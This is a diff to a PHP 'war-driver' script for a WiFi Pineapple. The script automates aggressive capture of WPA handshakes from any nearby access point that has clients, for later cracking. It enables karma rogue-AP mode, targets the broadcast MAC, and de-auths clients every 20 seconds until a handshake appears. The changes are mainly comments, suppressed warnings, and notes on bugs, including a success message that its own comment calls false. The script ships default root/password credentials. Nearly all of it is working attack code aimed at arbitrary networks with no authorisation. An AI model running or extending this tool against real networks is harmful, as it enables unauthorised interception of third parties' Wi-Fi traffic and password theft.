@@ -2,6 +2,7 @@
 /* 
 * sailboat-anon | fairwinds! | https://github.com/sailboat-anon
 * hak5 wifi pineapple war-driver | war-driver.php
+* Updated for v2 firmware
 *
 * automated AGGRESSIVE workflow for capturing handshakes
 * use with ohc-api.sh to fully automate the cracking pieces and for persistent loot | https://github.com/sailboat-anon/wifi-pineapple-mark-vii
@@ -34,10 +35,10 @@ echo "> Starting war-driver.php by sailboatanon\n";
 echo "> https://github.com/sailboat-anon/ \n";
 
 $config = array(
-    'server_ip' => "172.16.42.1",
+    'server_ip' => "172.16.42.1",       # Update this for your environment
     'server_port' => 1471,
     'admin_user' => "root",
-    'admin_password' => "password"
+    'admin_password' => "password"      # Update this for your environment
 );
 
 run_scand();
@@ -57,15 +58,21 @@ function set_aggro() {
         'enablePineAP' => true,
         'karma' => true,
         'logging' => true,
-        'pineap_mac' => '00:13:37:A8:1C:BB',
+        'pineap_mac' => '00:13:37:A8:1C:BB',    # Update if desired
         'target_mac' => 'FF:FF:FF:FF:FF:FF'
     ));
     authorized_put('/api/pineap/settings', $pineAP_aggro_settings, 'Enabling pineAP (AGGRO settings)');
 }
 
 function run_scand() {
-    set_aggro();
-    authorized_post('/api/recon/stop', null, 'Stopping active recon scans');
+
+/**********
+*   # Disabling temporarily; for some reason the recon scan returns null when either of these executes
+*
+*    set_aggro();
+*    authorized_post('/api/recon/stop', null, 'Stopping active recon scans');
+**********/
+
     $scan = authorized_post('/api/recon/start', array(
         'live' => true,
         'scan_time' => 0,
@@ -88,7 +95,7 @@ function run_scand() {
                         $handshake_hdr = $value[$i];
                         echo "> Found AP with clients (". ($handshake_hdr->bssid) .")\n";
                         $params_handshake_hdr = array(
-                            'ssid'          =>  '',
+                            'ssid'          =>  '',                             # Why not populated this?
                             'bssid'         =>  $handshake_hdr->bssid,
                             'encryption'    =>  $handshake_hdr->encryption,
                             'hidden'        =>  $handshake_hdr->hidden,
@@ -98,8 +105,8 @@ function run_scand() {
                             'data'          =>  $handshake_hdr->data,
                             'last_seen'     =>  $handshake_hdr->last_seen,
                             'probes'        =>  array(
-                                                    'Int64' =>  $handshake_hdr->Int64,
-                                                    'Valid' =>  $handshake_hdr->Valid
+                                                    'Int64' =>  @$handshake_hdr->Int64,     # Added @ to suppress warnings
+                                                    'Valid' =>  @$handshake_hdr->Valid      # Added @ to suppress warnings
                             ),
                             'clients'       =>  null);
                         
@@ -111,7 +118,8 @@ function run_scand() {
         if (is_array($handshake_req)) {
             foreach ($handshake_req as $hs_req) {
                 $bssid = $hs_req['bssid'];
-                $bssid_msg = 'Starting handshake capture ('. $bssid .')';
+                $ssid = $hs_req['ssid'];
+                $bssid_msg = 'Starting handshake capture ('. $ssid . ", " . $bssid .')';
                 authorized_post('/api/pineap/handshakes/start', $hs_req, $bssid_msg);
                 $cap_details = authorized_get('/api/pineap/handshakes/check', null, 'Getting status of handshake process');
                 $counter = 0;
@@ -120,10 +128,10 @@ function run_scand() {
                     echo "> Capture running, de-authing again in 20 seconds (" . $counter . ")\n";
                     sleep(20);
                     $counter++;
-                    if ($counter == 9) { // 2mins
+                    if ($counter == 9) { // 2mins           # hs list isn't checked until full 2 mins have passed; check sooner
                         $hs = authorized_get('/api/pineap/handshakes', null, 'Checking for handshakes'); 
-                        if (is_array($hs->handshakes)) { 
-                            echo "> Handshake captured!\n";
+                        if (is_array($hs->handshakes)) {        # This is only checking if hs table is populated; check for actual hs
+                            echo "> Handshake captured!\n";     # Not true; only indicates hs table is not empty
                             print_r(authorized_post('/api/pineapi/handshakes/stop'));
                             break;
                         }
